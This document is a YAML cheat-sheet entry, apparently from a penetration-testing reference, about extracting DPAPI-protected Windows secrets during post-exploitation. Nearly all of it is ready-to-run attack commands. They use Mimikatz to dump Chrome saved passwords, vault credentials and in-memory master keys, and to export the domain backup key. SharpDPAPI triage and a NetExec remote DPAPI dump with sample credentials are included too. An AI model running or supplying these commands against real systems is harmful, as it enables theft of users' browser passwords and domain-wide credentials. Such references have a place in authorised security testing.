---
description: |
  Extract credentials protected by Windows Data Protection API (DPAPI), including browser passwords, vault credentials, and master key decryption.
command: |
  # Mimikatz — extract Chrome saved passwords
  mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

  # Mimikatz — dump Windows Vault credentials
  mimikatz # vault::cred

  # Mimikatz — extract DPAPI master keys from memory
  mimikatz # sekurlsa::dpapi

  # SharpDPAPI — triage all DPAPI-protected secrets
  SharpDPAPI.exe triage

  # NetExec — remote DPAPI extraction
  nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' --dpapi

  # Find master key files on disk
  dir /a C:\Users\*\AppData\Roaming\Microsoft\Protect\*

  # Decrypt master key with known user password
  mimikatz # dpapi::masterkey /in:"C:\Users\sec_user\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}" /password:P@ssw0rd

  # Decrypt master key with domain backup key (requires DA)
  mimikatz # lsadump::backupkeys /system:DC01.senshu.sh /export
  mimikatz # dpapi::masterkey /in:"masterkey_file" /pvk:backup_key.pvk
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - SMB
techniques: []
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
  - https://github.com/GhostPack/SharpDPAPI
---
